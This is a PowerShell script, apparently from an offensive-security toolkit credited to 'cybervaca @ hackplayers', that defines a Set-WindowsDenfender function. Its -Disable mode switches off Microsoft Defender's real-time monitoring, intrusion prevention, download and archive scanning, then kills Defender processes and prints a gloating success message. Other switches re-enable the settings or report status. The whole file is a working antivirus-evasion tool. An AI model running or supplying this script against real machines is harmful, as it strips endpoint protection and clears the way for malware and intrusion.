function Set-WindowsDenfender {param ([switch]$Enable,[switch]$Disable)

$resultado = "
                                                                                                               
 _____ _____ _____    _ _ _ _____ _____ ____  _____ _ _ _ _____ ____  _____ _____ _____ _____ ____  _____ _____ 
|   __|   __|_   _|__| | | |     |   | |    \|     | | | |   __|    \|   __|   __|   __|   | |    \|   __| __  |
|__   |   __| | ||___| | | |-   -| | | |  |  |  |  | | | |__   |  |  |   __|   __|   __| | | |  |  |   __|    -|
|_____|_____| |_|    |_____|_____|_|___|____/|_____|_____|_____|____/|_____|__|  |_____|_|___|____/|_____|__|__|
                                                                                                              
                                                                                                      
                                               cybervaca @ hackplayers                                                                                                     
"

if ($Disable -eq $True) {
Set-MpPreference -DisableIOAVProtection $True
Set-MpPreference -DisableRealtimeMonitoring $True
Set-MpPreference -DisableIntrusionPreventionSystem $True
Set-MpPreference -DisableCatchupQuickScan $True
Set-MpPreference -DisableArchiveScanning $True
Get-Process | Select-Object -Property * | Where-Object {$_.Description -like "*defender*"} | Stop-Process
$resultado += "[+] Windows Defender right now is Disabled :D"
return $resultado
}

if ($Enable -eq $True) {
$proceso = 'C:\Program Files\Windows Defender\MSASCui.exe'
$startExe = New-Object System.Diagnostics.ProcessStartInfo 
$startExe.WindowStyle = "hidden"
$startExe.FileName = $proceso
[System.Diagnostics.Process]::Start($startExe) | Out-Null
Set-MpPreference -DisableIOAVProtection $False
Set-MpPreference -DisableRealtimeMonitoring $False
Set-MpPreference -DisableIntrusionPreventionSystem $False
Set-MpPreference -DisableCatchupQuickScan $False
Set-MpPreference -DisableArchiveScanning $False
$resultado += "[+] Windows Defender right now is Enabled"
return $resultado
}

if ($Enable -eq $False -and $Disable -eq $False){
if ((Get-Process -Name MSASCUI -ErrorAction SilentlyContinue).count -ge 1 ) {$resultado += "[+] Windows Defender is Enabled"} else {$resultado += "[+] Windows Defender is Disabled"}
return $resultado
}}
